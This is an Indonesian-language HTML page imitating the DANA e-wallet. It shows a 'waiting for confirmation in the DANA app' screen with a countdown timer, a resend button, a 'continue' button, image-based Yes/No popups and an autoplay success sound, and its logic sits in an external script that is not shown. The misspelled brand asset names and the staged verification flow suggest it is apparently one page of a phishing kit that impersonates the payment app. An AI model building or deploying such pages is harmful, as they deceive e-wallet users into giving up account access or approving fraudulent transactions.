<!DOCTYPE html>
<html lang="id">
<head>

<meta charset="UTF-8">

<meta name="viewport"
content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">

<title>Konfirmasi</title>

<link rel="stylesheet"
href="success.css">

</head>
<body>

<div class="container">

    <!-- LOGO -->
    <div class="logo-wrap">

        <img
        src="assets/logo-danaa.png"
        class="logo">

    </div>

    <!-- ========================= -->
    <!-- LOADING DANA -->
    <!-- ========================= -->

    <div class="dana-loading">

        <div class="spinner"></div>

        <div class="spinner-center">

            <img
            src="assets/loadingg-danaa.png"
            class="spinner-logo">

        </div>

    </div>

    <!-- TEXT -->

    <div class="title">
        Menunggu Konfirmasi di Aplikasi DANA
    </div>


    <!-- TIMER -->

    <div class="verify-text">
        Verifikasi Dalam
    </div>

    <div class="timer-wrap">

        <div class="time-box" id="minute">
            00
        </div>

        <div class="dots">:</div>

        <div class="time-box" id="second">
            30
        </div>

    </div>

    <button
class="btn-resend"
id="resendBtn">

    Kirim Ulang Verifikasi

</button>

<div class="lanjut-text">
    Jika sudah di verifikasi silahkan klik
</div>

    <!-- BUTTON -->

    <button
    class="btn-lanjut"
    id="lanjutBtn">

        LANJUTKAN

    </button>

</div>

<!-- ========================= -->
<!-- NOTIF -->
<!-- ========================= -->

<div
class="notif-overlay"
id="notifOverlay">

    <div
    class="notif-box"
    id="notifBox">

        <img
        src="assets/notif.png"
        class="notif-img">

    </div>

</div>

<!-- ========================= -->
<!-- POPUP -->
<!-- ========================= -->

<div
class="popup-overlay"
id="popup2">

    <div class="popup-box">

        <img
        src="assets/popup-ya-tidak.png"
        class="popup-img">

        <div class="btn-group">

            <!-- TIDAK -->
            <button
            class="btn-no"
            id="btnTidak">

                Tidak

            </button>

            <!-- YA -->
            <button
            class="btn-yes"
            id="btnYa">

                Ya

            </button>

        </div>

    </div>

</div>

<!-- ========================= -->
<!-- LOADING -->
<!-- ========================= -->

<div
class="loading-box"
id="loadingBox">

    <div class="loading-circle">

        <div class="spinner-ring"></div>

        <img
        src="assets/loadingg-danaa.png"
        class="loading-logo">

    </div>

    <div class="loading-text">

        Memuat...

    </div>

</div>

<!-- SOUND -->

<audio
id="successSound"
autoplay>

<source
src="assets/successss.mp3"
type="audio/mpeg">

</audio>

<!-- JS -->
<script src="success.js"></script>

</body>
</html>
